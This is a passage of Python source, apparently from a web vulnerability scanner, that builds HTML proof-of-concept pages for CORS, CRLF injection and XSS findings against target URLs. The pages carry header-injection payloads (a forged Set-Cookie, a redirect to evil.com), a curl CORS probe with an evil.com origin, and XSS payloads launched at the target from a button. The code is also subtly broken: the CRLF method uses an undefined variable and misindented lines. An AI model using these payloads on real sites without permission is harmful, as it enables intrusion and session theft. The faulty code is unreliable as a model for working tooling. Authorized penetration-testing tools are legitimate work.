            <option value="">Choose a vulnerability...</option>
            {dropdown_html}
        </select>
    </div>
    
    <div id="vulnInfo" class="vuln-info" style="display: none;">
        <h3>📊 Selected Vulnerability Details</h3>
        <div id="vulnDetails"></div>
    </div>
    
    <div class="url-box" id="urlBox" style="display: none;">
        <strong>Vulnerable URL:</strong><br>
        <span id="selectedUrl"></span>
    </div>
    
    <button class="button" onclick="testCORS()">🧪 Test CORS (iframe)</button>
    <button class="button" onclick="testCORSWithFetch()">🧪 Test CORS (fetch)</button>
    <button class="button" onclick="openInNewTab()">🔗 Open in New Tab</button>
    <button class="button" onclick="showAnalysis()">🔍 Show Analysis</button>
    <button class="button" onclick="showDetails()">📊 Show Details</button>
    
    <div class="result" id="result">
        Click "Test CORS" to check the vulnerability...<br><br>
        <strong>Note:</strong> If you see "Failed to fetch" or similar errors, this means the browser blocked the request for security. This does NOT mean the server is secure - use curl to test properly!
    </div>
    
    <div id="analysis" class="analysis" style="background: #f8f9fa; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #28a745; display: none;">
        <h3>🔍 Vulnerability Analysis</h3>
        <p><strong>Vulnerability Type:</strong> Cross-Origin Resource Sharing (CORS)</p>
        <p><strong>Risk Level:</strong> MEDIUM</p>
        <p><strong>Impact:</strong> Cross-origin data access, potential data leakage</p>
        <p><strong>Affected Parameter:</strong> CORS headers</p>
        <p><strong>Detection Method:</strong> CORS policy misconfiguration</p>
        <p><strong>Common Attack Vectors:</strong></p>
        <ul>
            <li>Cross-origin requests</li>
            <li>Data exfiltration</li>
            <li>API abuse</li>
            <li>Credential exposure</li>
        </ul>
        <div class="warning" style="background: #f8d7da; color: #721c24; padding: 10px; border-radius: 5px; margin: 10px 0;">
            <strong>⚠️ Warning:</strong> CORS misconfiguration can lead to unauthorized cross-origin access. 
            Use responsibly and only on systems you have permission to test.
        </div>
    </div>
    
    <div id="details" class="details" style="background: #fff3cd; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #ffc107; display: none; font-family: monospace;">
        <h3>📊 CORS Details</h3>
        <p><em>This shows what a successful CORS attack might reveal:</em></p>
        <div style="background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 3px;">
<strong>CORS Headers:</strong>
• Access-Control-Allow-Origin: *
• Access-Control-Allow-Credentials: true
• Access-Control-Allow-Methods: GET, POST, PUT, DELETE
• Access-Control-Allow-Headers: *

<strong>Common Misconfigurations:</strong>
• Wildcard origin (*)
• Credentials with wildcard
• Missing origin validation
• Overly permissive headers

<strong>Impact Examples:</strong>
• Cross-origin data access
• API abuse from malicious sites
• Credential theft
• Data exfiltration
        </div>
        <p><strong>Note:</strong> This is simulated content. The actual response will depend on the CORS configuration.</p>
    </div>
    
    <script>
        const vulnerabilities = {json.dumps(vuln_data)};
        let selectedVuln = null;
        
        function selectVulnerability() {{
            const select = document.getElementById('vulnSelect');
            const vulnInfo = document.getElementById('vulnInfo');
            const vulnDetails = document.getElementById('vulnDetails');
            const urlBox = document.getElementById('urlBox');
            const selectedUrl = document.getElementById('selectedUrl');
            
            if (select.value === '') {{
                vulnInfo.style.display = 'none';
                urlBox.style.display = 'none';
                selectedVuln = null;
                return;
            }}
            
            const index = parseInt(select.value);
            selectedVuln = vulnerabilities[index];
            
            // Mostrar información de la vulnerabilidad
            const methodClass = selectedVuln.method === 'GET' ? 'method-get' : 'method-post';
            
            vulnDetails.innerHTML = '';
            
            const methodP = document.createElement('p');
            methodP.innerHTML = `<span class="method-badge ${{methodClass}}">${{selectedVuln.method}}</span><strong>Method:</strong> ${{selectedVuln.method}}`;
            vulnDetails.appendChild(methodP);
            
            const payloadP = document.createElement('p');
            payloadP.innerHTML = '<strong>CORS Payload:</strong>';
            vulnDetails.appendChild(payloadP);
            
            const payloadDiv = document.createElement('div');
            payloadDiv.className = 'cors-payload';
            payloadDiv.textContent = selectedVuln.payload;
            vulnDetails.appendChild(payloadDiv);
            
            const urlP = document.createElement('p');
            urlP.innerHTML = '<strong>Full URL:</strong> ';
            const urlSpan = document.createElement('span');
            urlSpan.textContent = selectedVuln.url;
            urlP.appendChild(urlSpan);
            vulnDetails.appendChild(urlP);
            
            selectedUrl.textContent = selectedVuln.url;
            
            vulnInfo.style.display = 'block';
            urlBox.style.display = 'block';
        }}
        
        async function testCORS() {{
            if (!selectedVuln) {{
                alert('Please select a vulnerability first!');
                return;
            }}
            
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = '🔄 Testing CORS vulnerability...';
            
            try {{
                // Crear un iframe oculto para probar CORS
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = selectedVuln.url;
                document.body.appendChild(iframe);
                
                // Esperar un momento para que cargue
                setTimeout(() => {{
                    try {{
                        // Intentar acceder al contenido del iframe
                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        if (iframeDoc) {{
                            resultDiv.innerHTML = '✅ <strong>CORS VULNERABLE!</strong><br>Successfully accessed cross-origin content';
                            resultDiv.style.borderColor = '#e74c3c';
                        }} else {{
                            resultDiv.innerHTML = '❌ CORS properly configured - cross-origin access blocked';
                            resultDiv.style.borderColor = '#27ae60';
                        }}
                    }} catch (e) {{
                        // Si hay error, significa que CORS está funcionando
                        resultDiv.innerHTML = '❌ CORS properly configured - cross-origin access blocked';
                        resultDiv.style.borderColor = '#27ae60';
                    }}
                    document.body.removeChild(iframe);
                }}, 2000);
                
            }} catch (error) {{
                resultDiv.innerHTML = '⚠️ Error testing CORS: ' + error.message;
                resultDiv.style.borderColor = '#f39c12';
            }}
        }}
        
        // Función alternativa para probar CORS con fetch
        async function testCORSWithFetch() {{
            if (!selectedVuln) {{
                alert('Please select a vulnerability first!');
                return;
            }}
            
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = '🔄 Testing CORS with fetch...';
            
            try {{
                const response = await fetch(selectedVuln.url, {{
                    method: 'GET',
                    mode: 'cors',
                    credentials: 'include'
                }});
                
                const acao = response.headers.get('Access-Control-Allow-Origin');
                const acac = response.headers.get('Access-Control-Allow-Credentials');
                
                if (acao === '*' || (acao && acac === 'true')) {{
                    resultDiv.innerHTML = `✅ <strong>CORS VULNERABLE!</strong><br>ACAO: ${{acao}}<br>ACAC: ${{acac}}`;
                    resultDiv.style.borderColor = '#e74c3c';
                }} else {{
                    resultDiv.innerHTML = '❌ CORS headers not found or properly configured';
                    resultDiv.style.borderColor = '#27ae60';
                }}
            }} catch (error) {{
                if (error.message.includes('Failed to fetch') || error.message.includes('CORS')) {{
                    resultDiv.innerHTML = '⚠️ <strong>CORS TEST BLOCKED BY BROWSER</strong><br><br><strong>This is expected behavior!</strong><br>• The browser blocked the request for security<br>• This does NOT mean the server is secure<br>• Use curl or other tools to test CORS properly<br><br><strong>Manual Test:</strong><br><code>curl -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -X OPTIONS ' + selectedVuln.url + ' -v</code><br><br><strong>Look for:</strong><br>• access-control-allow-origin: https://evil.com (vulnerable)<br>• access-control-allow-origin: * (vulnerable)<br>• access-control-allow-credentials: true (dangerous)';
                    resultDiv.style.borderColor = '#f39c12';
                }} else {{
                    resultDiv.innerHTML = '⚠️ CORS test failed: ' + error.message;
                    resultDiv.style.borderColor = '#f39c12';
                }}
            }}
        }}
        
        function showAnalysis() {{
            const analysis = document.getElementById('analysis');
            if (analysis.style.display === 'none' || analysis.style.display === '') {{
                analysis.style.display = 'block';
            }} else {{
                analysis.style.display = 'none';
            }}
        }}
        
        function showDetails() {{
            const details = document.getElementById('details');
            if (details.style.display === 'none' || details.style.display === '') {{
                details.style.display = 'block';
            }} else {{
                details.style.display = 'none';
            }}
        }}
        
        function openInNewTab() {{
            const url = selectedVuln ? selectedVuln.url : '';
            window.open(url, '_blank');
        }}
        
        function copyUrl() {{
            const url = selectedVuln ? selectedVuln.url : '';
            navigator.clipboard.writeText(url).then(function() {{
                // Opcional: mostrar feedback
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = '✅ Copied!';
                setTimeout(() => {{
                    button.textContent = originalText;
                }}, 2000);
            }}).catch(function(err) {{
                console.error('Error copying URL: ', err);
                // Fallback: usar método alternativo
                const textArea = document.createElement('textarea');
                textArea.value = url;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            }});
        }}
    </script>
</body>
</html>
        """
        
        html_path = os.path.join(self.poc_dir, html_filename)
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return {
            'html_path': html_path,
            'screenshot_path': None,
            'html_filename': html_filename,
            'screenshot_filename': None
        }
    
    def generate_crlf_poc(self, target_url, method="GET", screenshot=False, domain=None):
        """Genera PoC para CRLF Injection"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        # Crear un hash único basado en la URL para evitar sobrescribir PoCs
        import hashlib
        url_hash = hashlib.md5(target_url.encode()).hexdigest()[:8]
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>CRLF Injection PoC - {target_url}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .header {{ background: #9b59b6; color: white; padding: 20px; border-radius: 5px; text-align: center; }}
        .url-box {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #9b59b6; }}
        .button {{ background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }}
        .payload {{ background: #2c3e50; color: #ecf0f1; padding: 15px; margin: 15px 0; border-radius: 5px; font-family: monospace; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🚨 CRLF Injection PoC</h1>
        <p>Target: <strong>{html.escape(target_url)}</strong></p>
        <p>Method: <strong>{method}</strong></p>
    </div>
    
    <div class="url-box">
        <strong>Vulnerable URL:</strong><br>
        {html.escape(target_url)}
    </div>
    
    <div class="payload">
        <strong>CRLF URLs to test:</strong><br>
        <select id="payloadSelect" onchange="updatePayload()" style="width: 100%; padding: 8px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; background: white;">
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0aX-Injected-Header: test')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0aX-Injected-Header: test')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0a%0d%0aHTTP/1.1 200 OK')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0a%0d%0aHTTP/1.1 200 OK')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0aContent-Length: 0')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0aContent-Length: 0')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0a%0d%0a')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0a%0d%0a')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0aSet-Cookie: malicious=value')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0aSet-Cookie: malicious=value')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0aLocation: http://evil.com')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0aLocation: http://evil.com')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0aX-Custom-Header: value')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0aX-Custom-Header: value')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0a%0d%0aHTTP/1.1 301 Moved Permanently')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0a%0d%0aHTTP/1.1 301 Moved Permanently')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0aCache-Control: no-cache')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0aCache-Control: no-cache')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0aX-Forwarded-For: 127.0.0.1')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0aX-Forwarded-For: 127.0.0.1')}</option>
        </select>
        <div id="selectedPayload" style="background: #e74c3c; color: white; padding: 5px; margin: 5px 0; border-radius: 3px; font-family: monospace; word-break: break-all;">
            <strong>Method:</strong> {method}<br>
            <strong>URL:</strong> {target_url.replace('PAYLOAD_PLACEHOLDER', '%0d%0aX-Injected-Header: test')}
        </div>
    </div>
    
    <button class="button" onclick="openInNewTab()">🔗 Open in New Tab</button>
    <button class="button" onclick="copyUrl()">📋 Copy URL</button>
    <button class="button" onclick="copyPayload()">📋 Copy Payload</button>
    <button class="button" onclick="showAnalysis()">🔍 Show Analysis</button>
    <button class="button" onclick="showDetails()">📊 Show Details</button>
    
    <div id="analysis" class="analysis" style="background: #f8f9fa; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #28a745; display: none;">
        <h3>🔍 Vulnerability Analysis</h3>
        <p><strong>Vulnerability Type:</strong> CRLF Injection</p>
        <p><strong>Risk Level:</strong> MEDIUM</p>
        <p><strong>Impact:</strong> Header injection, response splitting, cache poisoning</p>
        <p><strong>Affected Parameter:</strong> URL parameter</p>
        <p><strong>Detection Method:</strong> Carriage return and line feed injection</p>
        <p><strong>Common Attack Vectors:</strong></p>
        <ul>
            <li>Header injection</li>
            <li>Response splitting</li>
            <li>Cache poisoning</li>
            <li>HTTP response manipulation</li>
        </ul>
        <div class="warning" style="background: #f8d7da; color: #721c24; padding: 10px; border-radius: 5px; margin: 10px 0;">
            <strong>⚠️ Warning:</strong> CRLF injection can lead to header manipulation and cache poisoning. 
            Use responsibly and only on systems you have permission to test.
        </div>
    </div>
    
    <div id="details" class="details" style="background: #fff3cd; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #ffc107; display: none; font-family: monospace;">
        <h3>📊 CRLF Details</h3>
        <p><em>This shows what a successful CRLF attack might reveal:</em></p>
        <div style="background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 3px;">
<strong>Header Injection:</strong>
• X-Injected-Header: test
• X-Custom-Header: value
• Set-Cookie: malicious=value
• Location: malicious-url

<strong>Common Payloads:</strong>
• %0d%0aX-Injected-Header: test
• %0d%0a%0d%0aHTTP/1.1 200 OK
• %0d%0aContent-Length: 0
• %0d%0a%0d%0a

<strong>Impact Examples:</strong>
• Response header manipulation
• Cache poisoning attacks
• Session fixation
• HTTP response splitting
        </div>
        <p><strong>Note:</strong> This is simulated content. The actual response will depend on the server's header handling.</p>
    </div>
    
    <script>
        function updatePayload() {{
            const select = document.getElementById('payloadSelect');
            const display = document.getElementById('selectedPayload');
            display.innerHTML = '<strong>Method:</strong> {method}<br><strong>URL:</strong> ' + select.value;
        }}
        
        function copyPayload() {{
            const select = document.getElementById('payloadSelect');
            const payload = select.value;
            navigator.clipboard.writeText(payload).then(function() {{
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = '✅ Copied!';
                setTimeout(() => {{
                    button.textContent = originalText;
                }}, 2000);
            }}).catch(function(err) {{
                console.error('Error copying payload: ', err);
                const textArea = document.createElement('textarea');
                textArea.value = payload;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            }});
        }}
        
        function showAnalysis() {{
            const analysis = document.getElementById('analysis');
            if (analysis.style.display === 'none' || analysis.style.display === '') {{
                analysis.style.display = 'block';
            }} else {{
                analysis.style.display = 'none';
            }}
        }}
        
        function showDetails() {{
            const details = document.getElementById('details');
            if (details.style.display === 'none' || details.style.display === '') {{
                details.style.display = 'block';
            }} else {{
                details.style.display = 'none';
            }}
        }}
        
        function openInNewTab() {{
            const select = document.getElementById('payloadSelect');
            const url = select.value;
            window.open(url, '_blank');
        }}
        
        function copyUrl() {{
            const select = document.getElementById('payloadSelect');
            const url = select.value;
            navigator.clipboard.writeText(url).then(function() {{
                // Opcional: mostrar feedback
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = '✅ Copied!';
                setTimeout(() => {{
                    button.textContent = originalText;
                }}, 2000);
            }}).catch(function(err) {{
                console.error('Error copying URL: ', err);
                // Fallback: usar método alternativo
                const textArea = document.createElement('textarea');
                textArea.value = url;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            }});
        }}
    </script>
    
    <div style="margin-top: 20px; padding: 15px; background: #fff3cd; border-radius: 5px;">
        <strong>💡 How to test:</strong><br>
        1. Open the URL in a new tab<br>
        2. Use browser dev tools to see response headers<br>
        3. Look for injected headers or response splitting
    </div>
</body>
</html>
        """
        
                # Usar el dominio proporcionado o extraer de la primera URL
        if domain:
            base_domain = domain
            clean_domain = base_domain.replace(':', '_').replace('/', '_').replace('\\', '_')
        else:
            # Extraer el dominio base de la primera URL
            from urllib.parse import urlparse
            if vulnerable_urls:
                base_domain = urlparse(vulnerable_urls[0]).netloc
                clean_domain = base_domain.replace('www.', '').replace('.', '_')
            else:
                base_domain = "unknown"
                clean_domain = "unknown"
        
        # Crear nombre de archivo basado en el dominio
        html_filename = f"{clean_domain}_crlf.html"
        html_path = os.path.join(self.poc_dir, html_filename)
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        sys.stdout.write(f"✅ CRLF PoC generado: {html_filename}\n")
        sys.stdout.flush()
        return {
            'html_path': html_path,
            'screenshot_path': None,
            'html_filename': html_filename,
            'screenshot_filename': None
        }
    
    def generate_xss_poc(self, vulnerable_urls, screenshot=False, domain=None):
        """Genera PoC para XSS con múltiples URLs vulnerables"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Usar el dominio proporcionado o extraer de la primera URL
        if domain:
            base_domain = domain
            clean_domain = base_domain.replace(':', '_').replace('/', '_').replace('\\', '_')
        else:
            # Extraer el dominio base de la primera URL
            from urllib.parse import urlparse
            if vulnerable_urls:
                base_domain = urlparse(vulnerable_urls[0]).netloc
                # Limpiar el dominio para usar como nombre de archivo
                clean_domain = base_domain.replace('www.', '').replace('.', '_')
            else:
                base_domain = "unknown"
                clean_domain = "unknown"
        
        # Crear nombre de archivo basado en el dominio
        html_filename = f"{clean_domain}_xss.html"
        
        # Procesar las URLs vulnerables
        vuln_data = []
        for i, vuln_url in enumerate(vulnerable_urls):
            method = "GET"
            url = vuln_url
            payload = ""
            form_data = None
            
            # Si es un formulario, extraer datos
            if ' => ' in vuln_url:
                method = "POST"
                url_part = vuln_url.split(' => ')[0]
                url = url_part.split()[0]
                form_part = vuln_url.split(' => ')[1]
                try:
                    import ast
                    form_data = ast.literal_eval(form_part)
                    # Extraer payload del primer campo del formulario
                    if form_data:
                        payload = list(form_data.values())[0]
                except:
                    form_data = {}
            else:
                # Extraer payload de la URL
                from urllib.parse import parse_qs, urlparse
                parsed = urlparse(vuln_url)
                query_params = parse_qs(parsed.query)
                if query_params:
                    payload = list(query_params.values())[0][0]
                    # Decodificar URL encoding
                    from urllib.parse import unquote
                    payload = unquote(payload)
                    # Si es base64, decodificarlo
                    try:
                        import base64
                        decoded = base64.b64decode(payload).decode('utf-8')
                        payload = decoded
                    except:
                        pass  # Si no es base64, usar el payload original
            
            # Codificar payload en base64 para evitar problemas con caracteres especiales
            import base64
            encoded_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
            
            # Codificar también los datos del formulario en base64 para evitar ejecución
            encoded_form_data = {}
            if form_data:
                for key, value in form_data.items():
                    encoded_form_data[key] = base64.b64encode(value.encode('utf-8')).decode('utf-8')
            
            vuln_data.append({
                'index': i,
                'method': method,
                'url': url,
                'payload': encoded_payload,
                'form_data': encoded_form_data
            })
        
        # Generar opciones del dropdown (sanitizadas)
        dropdown_options = []
        for vuln in vuln_data:
            display_url = vuln['url'][:60] + "..." if len(vuln['url']) > 60 else vuln['url']
            # Sanitizar URL para evitar XSS
            safe_url = html.escape(display_url)
            safe_payload = html.escape(vuln['payload'][:30] + "..." if len(vuln['payload']) > 30 else vuln['payload'])
            option_text = f"{vuln['method']} - {safe_url} (Payload: {safe_payload})"
            dropdown_options.append(f'<option value="{vuln["index"]}">{option_text}</option>')
        
        dropdown_html = '\n'.join(dropdown_options)
        
        # Sanitizar base_domain
        safe_base_domain = html.escape(base_domain)
        
        # Generar el HTML del PoC
        import json
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>XSS Vulnerability PoC - {safe_base_domain}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .header {{ background: #e74c3c; color: white; padding: 20px; border-radius: 5px; text-align: center; }}
        .url-box {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #e74c3c; }}
        .button {{ background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }}
        .button:hover {{ background: #2980b9; }}
        .button:disabled {{ background: #bdc3c7; cursor: not-allowed; }}
        .result {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border: 2px solid #f39c12; }}
        .dropdown-container {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #3498db; }}
        .dropdown {{ width: 100%; padding: 10px; border: 1px solid #bdc3c7; border-radius: 5px; font-size: 14px; }}
        .vuln-info {{ background: #f8f9fa; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #28a745; }}
        .method-badge {{ display: inline-block; padding: 4px 8px; border-radius: 3px; font-size: 12px; font-weight: bold; margin-right: 10px; }}
        .method-get {{ background: #27ae60; color: white; }}
        .method-post {{ background: #e74c3c; color: white; }}
        .payload-box {{ background: #e74c3c; color: white; padding: 5px; border-radius: 3px; font-family: monospace; margin: 5px 0; }}
        .xss-payload {{ background: #e74c3c; color: white; padding: 5px; border-radius: 3px; font-family: monospace; margin: 5px 0; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🚨 XSS Vulnerability PoC</h1>
        <p>Target: <strong>{safe_base_domain}</strong></p>
        <p>Found <strong>{len(vuln_data)}</strong> XSS vulnerabilities</p>
    </div>
    
    <div class="dropdown-container">
        <h3>🔍 Select Vulnerability to Test</h3>
        <select class="dropdown" id="vulnSelect" onchange="selectVulnerability()">
            <option value="">Choose a vulnerability...</option>
            {dropdown_html}
        </select>
    </div>
    
    <div id="vulnInfo" class="vuln-info" style="display: none;">
        <h3>📊 Selected Vulnerability Details</h3>
        <div id="vulnDetails"></div>
    </div>
    
    <div class="url-box" id="urlBox" style="display: none;">
        <strong>Vulnerable URL:</strong><br>
        <span id="selectedUrl"></span>
    </div>
    
    <div style="text-align: center; margin: 20px 0;">
        <button class="button" onclick="openInNewTab()" id="openBtn" disabled>🔗 Open in New Tab (XSS will execute)</button>
        <button class="button" onclick="copyUrl()" id="copyBtn" disabled>📋 Copy URL</button>
        <button class="button" onclick="showAnalysis()">🔍 Show Analysis</button>
        <button class="button" onclick="showDetails()">📊 Show Details</button>
    </div>
    
    <div class="result" id="result">
        Select a vulnerability from the dropdown above to start testing...<br><br>
        <strong>Note:</strong> XSS tests may be blocked by browser security. Use the "Open in New Tab" button to test manually!
    </div>
    
    <div id="analysis" class="vuln-info" style="display: none;">
        <h3>🔍 XSS Vulnerability Analysis</h3>
        <p><strong>What is XSS?</strong></p>
        <p>Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users.</p>
        
        <p><strong>Types of XSS:</strong></p>
        <ul>
            <li><strong>Reflected XSS:</strong> Payload is reflected in the response immediately</li>
            <li><strong>Stored XSS:</strong> Payload is stored on the server and executed later</li>
            <li><strong>DOM-based XSS:</strong> Payload is executed through DOM manipulation</li>
        </ul>
        
        <p><strong>Common Payloads:</strong></p>
        <div class="xss-payload">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
        <div class="xss-payload">&lt;img src=x onerror=alert('XSS')&gt;</div>
        <div class="xss-payload">javascript:alert('XSS')</div>
        
        <p><strong>Impact:</strong></p>
        <ul>
            <li>Session hijacking</li>
            <li>Defacement</li>
            <li>Keylogger installation</li>
            <li>Credential theft</li>
        </ul>
    </div>
    
    <div id="details" class="vuln-info" style="display: none;">
        <h3>📊 Technical Details</h3>
        <p><strong>Detection Method:</strong> Parameter fuzzing with XSS payloads</p>
        <p><strong>Vulnerable Parameters:</strong> Various input fields and URL parameters</p>
        <p><strong>Payload Types:</strong> Script tags, event handlers, JavaScript URLs</p>
        <p><strong>Risk Level:</strong> High - Can lead to complete account compromise</p>
    </div>

    <script>
        const vulnerabilities = {json.dumps(vuln_data)};
        let selectedVuln = null;
        
        function selectVulnerability() {{
            const select = document.getElementById('vulnSelect');
            const vulnInfo = document.getElementById('vulnInfo');
            const vulnDetails = document.getElementById('vulnDetails');
            const urlBox = document.getElementById('urlBox');
            const selectedUrl = document.getElementById('selectedUrl');
            const openBtn = document.getElementById('openBtn');
            const copyBtn = document.getElementById('copyBtn');
            
            if (select.value === '') {{
                vulnInfo.style.display = 'none';
                urlBox.style.display = 'none';
                openBtn.disabled = true;
                copyBtn.disabled = true;
                selectedVuln = null;
                return;
            }}
            
            const index = parseInt(select.value);
            selectedVuln = vulnerabilities[index];
            
            // Mostrar información de la vulnerabilidad (usando textContent para evitar XSS)
            const methodClass = selectedVuln.method === 'GET' ? 'method-get' : 'method-post';
            
            // Crear elementos de forma segura
            vulnDetails.innerHTML = '';
            
            const methodP = document.createElement('p');
            methodP.innerHTML = `<span class="method-badge ${{methodClass}}">${{selectedVuln.method}}</span><strong>Method:</strong> ${{selectedVuln.method}}`;
            vulnDetails.appendChild(methodP);
            
            const payloadP = document.createElement('p');
            payloadP.innerHTML = '<strong>XSS Payload:</strong>';
            vulnDetails.appendChild(payloadP);
            
            const payloadDiv = document.createElement('div');
            payloadDiv.className = 'xss-payload';
            // Decodificar payload para mostrar el real, pero usar textContent para evitar ejecución
            const decodedPayload = atob(selectedVuln.payload);
            payloadDiv.textContent = decodedPayload; // textContent evita que se ejecute el HTML/JS
            vulnDetails.appendChild(payloadDiv);
            
            const urlP = document.createElement('p');
            urlP.innerHTML = '<strong>Full URL:</strong> ';
            const urlSpan = document.createElement('span');
            urlSpan.textContent = selectedVuln.url; // Usar textContent para evitar ejecución
            urlP.appendChild(urlSpan);
            vulnDetails.appendChild(urlP);
            
            selectedUrl.textContent = selectedVuln.url;
            
            vulnInfo.style.display = 'block';
            urlBox.style.display = 'block';
            openBtn.disabled = false;
            copyBtn.disabled = false;
        }}
        
        function showAnalysis() {{
            const analysis = document.getElementById('analysis');
            if (analysis.style.display === 'none' || analysis.style.display === '') {{
                analysis.style.display = 'block';
            }} else {{
                analysis.style.display = 'none';
            }}
        }}
        
        function showDetails() {{
            const details = document.getElementById('details');
            if (details.style.display === 'none' || details.style.display === '') {{
                details.style.display = 'block';
            }} else {{
                details.style.display = 'none';
            }}
        }}
        
        function openInNewTab() {{
            if (!selectedVuln) return;
            
            // Mostrar información antes de abrir
            const resultDiv = document.getElementById('result');
            const decodedPayload = atob(selectedVuln.payload);
            resultDiv.innerHTML = `🚀 <strong>Opening vulnerable URL in new tab...</strong><br><br><strong>URL:</strong> ${{selectedVuln.url}}<br><strong>Method:</strong> ${{selectedVuln.method}}<br><strong>Payload:</strong> <code>${{decodedPayload}}</code><br><br>⚠️ <strong>Warning:</strong> This will open the actual vulnerable URL with the XSS payload!`;
            resultDiv.style.borderColor = '#e74c3c';
            
            // Si es POST, crear un formulario y enviarlo
            if (selectedVuln.method === 'POST') {{
                // Crear un formulario temporal para enviar POST
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = selectedVuln.url;
                form.target = '_blank';
                form.style.display = 'none';
                
                // Agregar el payload como campo del formulario
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'searchFor';
                input.value = atob(selectedVuln.payload);
                form.appendChild(input);
                
                // Agregar el formulario al DOM y enviarlo
                document.body.appendChild(form);
                form.submit();
                document.body.removeChild(form);
            }} else {{
                // Para GET, construir la URL con el payload
                let realUrl = selectedVuln.url;
                const separator = realUrl.includes('?') ? '&' : '?';
                realUrl = realUrl + separator + 'test=' + encodeURIComponent(atob(selectedVuln.payload));
                window.open(realUrl, '_blank');
            }}
        }}
        
        function copyUrl() {{
            if (!selectedVuln) return;
            
            // Usar la URL real sin sanitizar para que el XSS funcione
            const realUrl = selectedVuln.url; // Ya no está sanitizada
            
            navigator.clipboard.writeText(realUrl).then(function() {{
                const resultDiv = document.getElementById('result');
                const decodedPayload = atob(selectedVuln.payload);
            resultDiv.innerHTML = `📋 <strong>URL copied to clipboard!</strong><br><br><strong>URL:</strong> ${{realUrl}}<br><strong>Method:</strong> ${{selectedVuln.method}}<br><strong>Payload:</strong> <code>${{decodedPayload}}</code>`;
                resultDiv.style.borderColor = '#27ae60';
            }}).catch(function(err) {{
                console.error('Could not copy text: ', err);
            }});
        }}
    </script>
</body>
</html>"""
        
        # Guardar el archivo
        html_path = os.path.join(self.output_dir, "poc", html_filename)
        
        # Asegurar que el directorio existe
        os.makedirs(os.path.dirname(html_path), exist_ok=True)
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return {
            'html_path': html_path,
            'screenshot_path': None,
            'html_filename': html_filename,
            'screenshot_filename': None
        }
    def generate_lfi_poc(self, vulnerable_urls, screenshot=False, domain=None):
        """Genera PoC para LFI con múltiples URLs vulnerables"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        # Crear un hash único basado en las URLs para evitar sobrescribir PoCs
        import hashlib
        urls_str = '|'.join(vulnerable_urls)
        url_hash = hashlib.md5(urls_str.encode()).hexdigest()[:8]
        
        # Extraer el dominio base de la primera URL
        from urllib.parse import urlparse
        if vulnerable_urls:
            base_domain = urlparse(vulnerable_urls[0]).netloc
        else:
            base_domain = "unknown"
